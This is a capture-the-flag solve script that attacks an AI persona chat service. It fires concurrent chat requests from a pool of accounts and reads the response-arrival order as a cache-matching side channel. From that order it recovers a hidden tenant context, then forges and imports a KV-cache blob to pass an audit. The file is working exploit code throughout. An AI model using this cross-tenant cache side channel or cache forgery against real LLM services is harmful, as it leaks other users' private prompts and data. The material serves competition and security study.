#!/usr/bin/env python3
"""
No Hot Water Club. Recovers TENANT_CONTEXT through the response-ordering
channel, rebuilds the KV cache blob, runs the continuity audit.
    ctf-python solve/solve.py <mode>
Modes: headcheck, recover, timing, blob, audit, all. Resumes from
scratch/state.json.
"""
import itertools
import json
import os
import secrets
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

import requests

sys.path.insert(0, os.path.expanduser("~/github/ctf-writeups/lib"))
import ctf  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
GRAMMAR = json.load(open(os.path.join(ROOT, "artifacts", "grammar.json")))
STATE_PATH = os.path.join(ROOT, "scratch", "state.json")
PASSWORD = "hotwater12345"
HEAD = "Mira's continuity note: Curierul Caca a "
TERM = "\n[END HANDOFF]"

# slot name, candidate list, text that follows the slot value
SLOTS = [
    ("V1", GRAMMAR["VERBS"], " "),
    ("O1", GRAMMAR["OBJ_DEF"], " "),
    ("L1", GRAMMAR["LOC"], " "),
    ("T1", GRAMMAR["TIME"], ". Apoi a "),
    ("V2", GRAMMAR["VERBS"], " "),
    ("I2", GRAMMAR["OBJ_INDEF"], " "),
    ("L2", GRAMMAR["LOC"], " și a păstrat "),
    ("O2", GRAMMAR["OBJ_DEF"], " "),
    ("T2", GRAMMAR["TIME"], ". La final a "),
    ("V3", GRAMMAR["VERBS"], " "),
    ("O3", GRAMMAR["OBJ_DEF"], " "),
    ("L3", GRAMMAR["LOC"], " și a lăsat "),
    ("I3", GRAMMAR["OBJ_INDEF"], " "),
    ("T3", GRAMMAR["TIME"], "."),
]


def load_state():
    if os.path.exists(STATE_PATH):
        return json.load(open(STATE_PATH))
    return {}


def save_state(state):
    json.dump(state, open(STATE_PATH, "w"), ensure_ascii=False, indent=1)


class Pool:
    """A pool of accounts, each with one persona, so a batch can carry
    one message per distinct principal."""

    def __init__(self, base, size):
        self.base = base.rstrip("/")
        self.workers = []
        self.build(size)

    def build(self, size):
        def make(_):
            last = None
            for _attempt in range(8):
                try:
                    s = requests.Session()
                    name = "r" + secrets.token_hex(8)
                    r = s.post(self.base + "/api/accounts",
                               json={"username": name, "password": PASSWORD}, timeout=60)
                    r.raise_for_status()
                    session = r.json()["session"]
                    body = {"manifest": {"name": "Mira", "capabilities": ["memory.search"]},
                            "memories": [{"text": "probe"}], "runtime": {}}
                    r = s.post(self.base + "/api/v1/import", json=body,
                               headers={"x-soul-session": session}, timeout=120)
                    r.raise_for_status()
                    return (s, session, r.json()["id"])
                except Exception as error:  # noqa: BLE001
                    last = error
                    time.sleep(2 + 2 * _attempt)
            raise last

        with ThreadPoolExecutor(max_workers=4) as ex:
            self.workers = list(ex.map(make, range(size)))
        print(f"[+] pool of {len(self.workers)} principals ready", flush=True)

    def probe(self, messages, timeout=600):
        """Fire every message at the same instant. Return them ordered by
        response arrival, which is the server's descending match_length order."""
        assert len(messages) <= len(self.workers), "pool too small"
        n = len(messages)
        barrier = threading.Barrier(n)
        results = [None] * n

        def one(i):
            sess, token, pid = self.workers[i]
            body = json.dumps({"message": messages[i]})
            barrier.wait()
            start = time.time()
            try:
                r = sess.post(f"{self.base}/api/personas/{pid}/chat", data=body,
                              headers={"x-soul-session": token,
                                       "content-type": "application/json"},
                              timeout=timeout)
                results[i] = (time.time(), r.status_code, r.text[:200])
            except Exception as error:  # noqa: BLE001
                results[i] = (time.time() + 1e6, -1, repr(error)[:200])
            _ = start

        threads = [threading.Thread(target=one, args=(i,)) for i in range(n)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        order = sorted(range(n), key=lambda i: results[i][0])
        return order, results


def resolve_slot(pool, prefix, candidates, rounds=5):
    """Return the candidate whose value continues the secret context.

    The correct candidate always has the strictly largest match_length, so the
    server always answers it first. Every wrong candidate ties with the others
    and is shuffled, so two agreeing rounds are strong evidence."""
    messages = [prefix + value for value in candidates]
    winners = []
    for attempt in range(rounds):
        order, results = pool.probe(messages)
        bad = [r for r in results if r[1] != 200]
        if bad:
            print(f"    [!] {len(bad)} non 200 responses, first: {bad[0]}", flush=True)
        # a failed request sorts last by construction, so trust only 200s
        order = [i for i in order if results[i][1] == 200]
        if not order:
            print("    [!] whole batch failed, backing off", flush=True)
            time.sleep(20)
            continue
        winner = candidates[order[0]]
        gap = results[order[1]][0] - results[order[0]][0] if len(order) > 1 else 0
        print(f"    round {attempt}: winner {winner!r} gap {gap:.3f}s", flush=True)
        winners.append(winner)
        if len(winners) >= 2 and winners[-1] == winners[-2]:
            return winners[-1]
    counts = {w: winners.count(w) for w in winners}
    return max(counts, key=counts.get)


def truncation_probe(pool, text, max_parts=None):
    """Send word level truncations of `text`. match_length is min(m, len(trunc)),
    so the answer order is: every truncation at or past the divergence point
    (shuffled), then the shorter ones strictly longest first. Prints the order so
    the divergence point can be read off."""
    words = text.split(" ")
    parts = [" ".join(words[:i]) for i in range(1, len(words) + 1)]
    if max_parts:
        parts = parts[-max_parts:]
    parts = parts[:len(pool.workers)]
    order, results = pool.probe(parts)
    for rank, i in enumerate(order):
        print(f"  {rank:3d} len_words={len(parts[i].split(' ')):3d} "
              f"{results[i][1]} {parts[i][-40:]!r}", flush=True)
    return [parts[i] for i in order]


def recover(base):
    state = load_state()
    prefix = state.get("prefix", HEAD)
    done = state.get("slots", {})
    pool = Pool(base, max(len(c) for _, c, _ in SLOTS) + 1)
    for name, candidates, follow in SLOTS:
        if name in done:
            continue
        print(f"[*] slot {name}, {len(candidates)} candidates", flush=True)
        value = resolve_slot(pool, prefix, candidates)
        done[name] = value
        prefix = prefix + value + follow
        state["slots"] = done
        state["prefix"] = prefix
        state["context"] = prefix
        save_state(state)
        print(f"[+] {name} = {value!r}", flush=True)
        print(f"    context so far: {prefix!r}", flush=True)
    print("[+] recovered context:")
    print(state["context"])
    return state["context"]


def build_blob(context, container="nohotwater-local"):
    req = os.path.join(ROOT, "scratch", "req_secret.json")
    out = os.path.join(ROOT, "scratch", "out_secret.json")
    json.dump({"context": context}, open(req, "w"), ensure_ascii=False)
    subprocess.run(["docker", "cp", os.path.join(HERE, "make_blob.py"),
                    f"{container}:/tmp/make_blob.py"], check=True)
    subprocess.run(["docker", "cp", req, f"{container}:/tmp/req.json"], check=True)
    subprocess.run(["docker", "exec", "-e", "HF_HOME=/models", container,
                    "python", "/tmp/make_blob.py", "/tmp/req.json", "/tmp/out.json"], check=True)
    subprocess.run(["docker", "cp", f"{container}:/tmp/out.json", out], check=True)
    data = json.load(open(out))
    print(f"[+] tokens {data['tokens']} digest {data['digest']}")
    return data["blob"]


def audit(base, blob):
    base = base.rstrip("/")
    s = requests.Session()
    name = "r" + secrets.token_hex(8)
    r = s.post(base + "/api/accounts", json={"username": name, "password": PASSWORD}, timeout=60)
    r.raise_for_status()
    token = r.json()["session"]
    body = {"manifest": {"name": "Mira", "capabilities": ["memory.search"]},
            "memories": [{"text": "audit"}],
            "runtime": {"kv_cache": {"format": "safetensors/base64", "cache": blob}}}
    r = s.post(base + "/api/v1/import", json=body,
               headers={"x-soul-session": token}, timeout=600)
    r.raise_for_status()
    pid = r.json()["id"]
    r = s.post(f"{base}/api/personas/{pid}/chat", json={"message": "continuity audit"},
               headers={"x-soul-session": token}, timeout=600)
    print(r.status_code, r.text)
    return r.text


LOCAL_URL = "http://127.0.0.1:13002"   # docker container nohotwater-local


def resolve_base(argv):
    """Where to point. The three-way switch the script contract asks for.

    CTF_LOCAL=1 wins, then an explicit argv, then CTF_TARGET, then the instance
    this run claimed (scratch/instance.json), then meta.json. Nothing is baked
    in: an isolated deployment gets a fresh hostname every time, so a hard coded
    URL would document a solution that no longer solves the challenge.
    """
    if os.environ.get("CTF_LOCAL"):
        return LOCAL_URL
    if argv:
        return argv[0].rstrip("/")
    t = ctf.target(start=HERE)
    if t.get("kind") == "http":
        return t["url"].rstrip("/")
    path = os.path.join(ROOT, "scratch", "instance.json")
    if os.path.exists(path):
        url = json.load(open(path)).get("url")
        if url:
            return url.rstrip("/")
    raise SystemExit(
        "no target. Claim one with `python3 solve/mgr.py claim`, or set "
        "CTF_TARGET='https://<deployment>.challs.ctf.thefewchosen.com', or "
        "CTF_LOCAL=1 for the local docker copy.")


def wait_healthy(base, budget=1800):
    """GET /health is the ONLY honest readiness test.

    While a deployment boots the ingress serves a placeholder titled "TFCCTF
    Challenge Loading" that answers GET / with 200 and POST with 405, so a 200
    on / means nothing. The placeholder 404s /health; the express front answers
    {"ok":true}. An instant 502 on a brain call means uvicorn died behind a live
    node, which start.sh never notices, so that pod is bricked: swap it.
    """
    deadline = time.time() + budget
    while time.time() < deadline:
        try:
            r = requests.get(base + "/health", timeout=25)
            if r.status_code == 200 and "ok" in r.text:
                return True
            print(f"[wait] placeholder, /health {r.status_code}", flush=True)
        except Exception as error:  # noqa: BLE001
            print(f"[wait] {error!r}"[:120], flush=True)
        time.sleep(10)
    return False


def chain(base):
    """input -> flag, the one path both the local and the remote run take."""
    print(f"[*] target {base}", flush=True)
    if not wait_healthy(base):
        raise SystemExit("[!] never became healthy")
    # state.json is a resume checkpoint, one slot per oracle batch, so an
    # an instance swap mid run costs one slot, not the whole recovery. it is
    # keyed by target: point at a different deployment and it re-derives instead
    # of replaying a stale answer.
    state = load_state()
    if state.get("target") != base:
        save_state({"target": base})
    context = recover(base)                 # 14 ordering-oracle batches
    blob = build_blob(context)              # bit exact fp32 replay, in docker
    json.dump({"blob": blob}, open(os.path.join(ROOT, "scratch", "blob.json"), "w"))
    return audit(base, blob)                # /api/v1/import + "continuity audit"


if __name__ == "__main__":
    modes = {"recover", "blob", "audit", "headcheck", "timing", "all"}
    if not sys.argv[1:] or sys.argv[1] not in modes:
        ctf.win(chain(resolve_base(sys.argv[1:])))
        sys.exit(0)
    mode = sys.argv[1]
    if mode == "recover":
        recover(sys.argv[2])
    elif mode == "blob":
        state = load_state()
        blob = build_blob(state["context"])
        json.dump({"blob": blob}, open(os.path.join(ROOT, "scratch", "blob.json"), "w"))
    elif mode == "audit":
        blob = json.load(open(os.path.join(ROOT, "scratch", "blob.json")))["blob"]
        audit(sys.argv[2], blob)
    elif mode == "headcheck":
        pool = Pool(sys.argv[2], 22)
        truncation_probe(pool, HEAD.strip())
    elif mode == "timing":
        pool = Pool(sys.argv[2], 22)
        truncation_probe(pool, load_state()["context"], max_parts=21)
    elif mode == "all":
        ctf.win(chain(resolve_base(sys.argv[2:])))
